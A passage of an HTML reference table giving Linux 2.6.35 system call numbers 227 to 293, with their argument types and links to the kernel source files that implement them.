*path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L298" target="_blank" rel="noopener">fs/xattr.c:298</a></td></tr><tr><td>228</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html" target="_blank" rel="noopener">sys_fsetxattr</a></td><td>0xe4</td><td>int fd</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L317" target="_blank" rel="noopener">fs/xattr.c:317</a></td></tr><tr><td>229</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html" target="_blank" rel="noopener">sys_getxattr</a></td><td>0xe5</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L376" target="_blank" rel="noopener">fs/xattr.c:376</a></td></tr><tr><td>230</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html" target="_blank" rel="noopener">sys_lgetxattr</a></td><td>0xe6</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L390" target="_blank" rel="noopener">fs/xattr.c:390</a></td></tr><tr><td>231</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html" target="_blank" rel="noopener">sys_fgetxattr</a></td><td>0xe7</td><td>int fd</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L404" target="_blank" rel="noopener">fs/xattr.c:404</a></td></tr><tr><td>232</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html" target="_blank" rel="noopener">sys_listxattr</a></td><td>0xe8</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L449" target="_blank" rel="noopener">fs/xattr.c:449</a></td></tr><tr><td>233</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html" target="_blank" rel="noopener">sys_llistxattr</a></td><td>0xe9</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L463" target="_blank" rel="noopener">fs/xattr.c:463</a></td></tr><tr><td>234</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html" target="_blank" rel="noopener">sys_flistxattr</a></td><td>0xea</td><td>int fd</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L477" target="_blank" rel="noopener">fs/xattr.c:477</a></td></tr><tr><td>235</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html" target="_blank" rel="noopener">sys_removexattr</a></td><td>0xeb</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L509" target="_blank" rel="noopener">fs/xattr.c:509</a></td></tr><tr><td>236</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html" target="_blank" rel="noopener">sys_lremovexattr</a></td><td>0xec</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L527" target="_blank" rel="noopener">fs/xattr.c:527</a></td></tr><tr><td>237</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html" target="_blank" rel="noopener">sys_fremovexattr</a></td><td>0xed</td><td>int fd</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L545" target="_blank" rel="noopener">fs/xattr.c:545</a></td></tr><tr><td>238</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html" target="_blank" rel="noopener">sys_tkill</a></td><td>0xee</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2395" target="_blank" rel="noopener">kernel/signal.c:2395</a></td></tr><tr><td>239</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html" target="_blank" rel="noopener">sys_sendfile64</a></td><td>0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L916" target="_blank" rel="noopener">fs/read_write.c:916</a></td></tr><tr><td>240</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html" target="_blank" rel="noopener">sys_futex</a></td><td>0xf0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2605" target="_blank" rel="noopener">kernel/futex.c:2605</a></td></tr><tr><td>241</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html" target="_blank" rel="noopener">sys_sched_setaffinity</a></td><td>0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4765" target="_blank" rel="noopener">kernel/sched.c:4765</a></td></tr><tr><td>242</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html" target="_blank" rel="noopener">sys_sched_getaffinity</a></td><td>0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4817" target="_blank" rel="noopener">kernel/sched.c:4817</a></td></tr><tr><td>243</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_thread_area.2.html" target="_blank" rel="noopener">sys_set_thread_area</a></td><td>0xf3</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="noopener">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/syscall.c?v=2.6.35#L222" target="_blank" rel="noopener">arch/mips/kernel/syscall.c:222</a></td></tr><tr><td>244</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_thread_area.2.html" target="_blank" rel="noopener">sys_get_thread_area</a></td><td>0xf4</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="noopener">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>245</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html" target="_blank" rel="noopener">sys_io_setup</a></td><td>0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t __user *ctx</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1245" target="_blank" rel="noopener">fs/aio.c:1245</a></td></tr><tr><td>246</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html" target="_blank" rel="noopener">sys_io_destroy</a></td><td>0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1283" target="_blank" rel="noopener">fs/aio.c:1283</a></td></tr><tr><td>247</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html" target="_blank" rel="noopener">sys_io_getevents</a></td><td>0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="noopener">struct io_event __user *events</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1808" target="_blank" rel="noopener">fs/aio.c:1808</a></td></tr><tr><td>248</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html" target="_blank" rel="noopener">sys_io_submit</a></td><td>0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb __user * __user *</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1711" target="_blank" rel="noopener">fs/aio.c:1711</a></td></tr><tr><td>249</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html" target="_blank" rel="noopener">sys_io_cancel</a></td><td>0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb __user *iocb</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="noopener">struct io_event __user *result</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1746" target="_blank" rel="noopener">fs/aio.c:1746</a></td></tr><tr><td>250</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html" target="_blank" rel="noopener">sys_fadvise64</a></td><td>0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>251</td><td>not implemented</td><td>0xfb</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>252</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html" target="_blank" rel="noopener">sys_exit_group</a></td><td>0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1087" target="_blank" rel="noopener">kernel/exit.c:1087</a></td></tr><tr><td>253</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html" target="_blank" rel="noopener">sys_lookup_dcookie</a></td><td>0xfd</td><td>u64 cookie64</td><td>char __user *buf</td><td>size_t len</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>254</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html" target="_blank" rel="noopener">sys_epoll_create</a></td><td>0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1215" target="_blank" rel="noopener">fs/eventpoll.c:1215</a></td></tr><tr><td>255</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html" target="_blank" rel="noopener">sys_epoll_ctl</a></td><td>0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="noopener">struct epoll_event __user *event</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1228" target="_blank" rel="noopener">fs/eventpoll.c:1228</a></td></tr><tr><td>256</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html" target="_blank" rel="noopener">sys_epoll_wait</a></td><td>0x100</td><td>int epfd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="noopener">struct epoll_event __user *events</a></td><td>int maxevents</td><td>int timeout</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1320" target="_blank" rel="noopener">fs/eventpoll.c:1320</a></td></tr><tr><td>257</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html" target="_blank" rel="noopener">sys_remap_file_pages</a></td><td>0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/fremap.c?v=2.6.35#L123" target="_blank" rel="noopener">mm/fremap.c:123</a></td></tr><tr><td>258</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html" target="_blank" rel="noopener">sys_set_tid_address</a></td><td>0x102</td><td>int __user *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L920" target="_blank" rel="noopener">kernel/fork.c:920</a></td></tr><tr><td>259</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html" target="_blank" rel="noopener">sys_timer_create</a></td><td>0x103</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="noopener">struct sigevent __user *timer_event_spec</a></td><td>timer_t __user * created_timer_id</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L522" target="_blank" rel="noopener">kernel/posix-timers.c:522</a></td></tr><tr><td>260</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html" target="_blank" rel="noopener">sys_timer_settime</a></td><td>0x104</td><td>timer_t timer_id</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">const struct itimerspec __user *new_setting</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *old_setting</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L800" target="_blank" rel="noopener">kernel/posix-timers.c:800</a></td></tr><tr><td>261</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html" target="_blank" rel="noopener">sys_timer_gettime</a></td><td>0x105</td><td>timer_t timer_id</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *setting</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L702" target="_blank" rel="noopener">kernel/posix-timers.c:702</a></td></tr><tr><td>262</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html" target="_blank" rel="noopener">sys_timer_getoverrun</a></td><td>0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L732" target="_blank" rel="noopener">kernel/posix-timers.c:732</a></td></tr><tr><td>263</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html" target="_blank" rel="noopener">sys_timer_delete</a></td><td>0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="noopener">kernel/posix-timers.c:855</a></td></tr><tr><td>264</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html" target="_blank" rel="noopener">sys_clock_settime</a></td><td>0x108</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L941" target="_blank" rel="noopener">kernel/posix-timers.c:941</a></td></tr><tr><td>265</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html" target="_blank" rel="noopener">sys_clock_gettime</a></td><td>0x109</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L954" target="_blank" rel="noopener">kernel/posix-timers.c:954</a></td></tr><tr><td>266</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html" target="_blank" rel="noopener">sys_clock_getres</a></td><td>0x10a</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L971" target="_blank" rel="noopener">kernel/posix-timers.c:971</a></td></tr><tr><td>267</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html" target="_blank" rel="noopener">sys_clock_nanosleep</a></td><td>0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rmtp</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L1001" target="_blank" rel="noopener">kernel/posix-timers.c:1001</a></td></tr><tr><td>268</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs64.2.html" target="_blank" rel="noopener">sys_statfs64</a></td><td>0x10c</td><td>const char __user *path</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="noopener">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L118" target="_blank" rel="noopener">fs/statfs.c:118</a></td></tr><tr><td>269</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs64.2.html" target="_blank" rel="noopener">sys_fstatfs64</a></td><td>0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="noopener">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L154" target="_blank" rel="noopener">fs/statfs.c:154</a></td></tr><tr><td>270</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html" target="_blank" rel="noopener">sys_tgkill</a></td><td>0x10e</td><td>int tgid</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2383" target="_blank" rel="noopener">kernel/signal.c:2383</a></td></tr><tr><td>271</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html" target="_blank" rel="noopener">sys_utimes</a></td><td>0x10f</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L219" target="_blank" rel="noopener">fs/utimes.c:219</a></td></tr><tr><td>272</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64_64.2.html" target="_blank" rel="noopener">sys_fadvise64_64</a></td><td>0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>273</td><td>not implemented</td><td>0x111</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>274</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html" target="_blank" rel="noopener">sys_mbind</a></td><td>0x112</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1232" target="_blank" rel="noopener">mm/mempolicy.c:1232</a></td></tr><tr><td>275</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html" target="_blank" rel="noopener">sys_get_mempolicy</a></td><td>0x113</td><td>int __user *policy</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1348" target="_blank" rel="noopener">mm/mempolicy.c:1348</a></td></tr><tr><td>276</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html" target="_blank" rel="noopener">sys_set_mempolicy</a></td><td>0x114</td><td>int mode</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1254" target="_blank" rel="noopener">mm/mempolicy.c:1254</a></td></tr><tr><td>277</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html" target="_blank" rel="noopener">sys_mq_open</a></td><td>0x115</td><td>const char __user *name</td><td>int oflag</td><td>mode_t mode</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">struct mq_attr __user *attr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L673" target="_blank" rel="noopener">ipc/mqueue.c:673</a></td></tr><tr><td>278</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html" target="_blank" rel="noopener">sys_mq_unlink</a></td><td>0x116</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L746" target="_blank" rel="noopener">ipc/mqueue.c:746</a></td></tr><tr><td>279</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html" target="_blank" rel="noopener">sys_mq_timedsend</a></td><td>0x117</td><td>mqd_t mqdes</td><td>const char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L840" target="_blank" rel="noopener">ipc/mqueue.c:840</a></td></tr><tr><td>280</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html" target="_blank" rel="noopener">sys_mq_timedreceive</a></td><td>0x118</td><td>mqd_t mqdes</td><td>char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int __user *msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L934" target="_blank" rel="noopener">ipc/mqueue.c:934</a></td></tr><tr><td>281</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html" target="_blank" rel="noopener">sys_mq_notify</a></td><td>0x119</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="noopener">const struct sigevent __user *notification</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1023" target="_blank" rel="noopener">ipc/mqueue.c:1023</a></td></tr><tr><td>282</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html" target="_blank" rel="noopener">sys_mq_getsetattr</a></td><td>0x11a</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">const struct mq_attr __user *mqstat</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">struct mq_attr __user *omqstat</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1154" target="_blank" rel="noopener">ipc/mqueue.c:1154</a></td></tr><tr><td>283</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html" target="_blank" rel="noopener">sys_kexec_load</a></td><td>0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td><a href="http://lxr.free-electrons.com/source/include/linux/kexec.h?v=2.6.35#L61" target="_blank" rel="noopener">struct kexec_segment __user *segments</a></td><td>unsigned long flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/kexec.c?v=2.6.35#L939" target="_blank" rel="noopener">kernel/kexec.c:939</a></td></tr><tr><td>284</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html" target="_blank" rel="noopener">sys_waitid</a></td><td>0x11c</td><td>int which</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/arch/ia64/include/asm/siginfo.h?v=2.6.35#L19" target="_blank" rel="noopener">struct siginfo __user *infop</a></td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1655" target="_blank" rel="noopener">kernel/exit.c:1655</a></td></tr><tr><td>285</td><td>not implemented</td><td>0x11d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>286</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html" target="_blank" rel="noopener">sys_add_key</a></td><td>0x11e</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const void __user *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L57" target="_blank" rel="noopener">security/keys/keyctl.c:57</a></td></tr><tr><td>287</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html" target="_blank" rel="noopener">sys_request_key</a></td><td>0x11f</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const char __user *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L149" target="_blank" rel="noopener">security/keys/keyctl.c:149</a></td></tr><tr><td>288</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html" target="_blank" rel="noopener">sys_keyctl</a></td><td>0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L1338" target="_blank" rel="noopener">security/keys/keyctl.c:1338</a></td></tr><tr><td>289</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html" target="_blank" rel="noopener">sys_ioprio_set</a></td><td>0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L76" target="_blank" rel="noopener">fs/ioprio.c:76</a></td></tr><tr><td>290</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html" target="_blank" rel="noopener">sys_ioprio_get</a></td><td>0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L192" target="_blank" rel="noopener">fs/ioprio.c:192</a></td></tr><tr><td>291</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html" target="_blank" rel="noopener">sys_inotify_init</a></td><td>0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L680" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:680</a></td></tr><tr><td>292</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html" target="_blank" rel="noopener">sys_inotify_add_watch</a></td><td>0x124</td><td>int fd</td><td>const char __user *path</td><td>u32 mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L685" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:685</a></td></tr><tr><td>293</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html" target="_blank" rel="noopener">sys_inotify_rm_watch</a></td><td>0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td><a 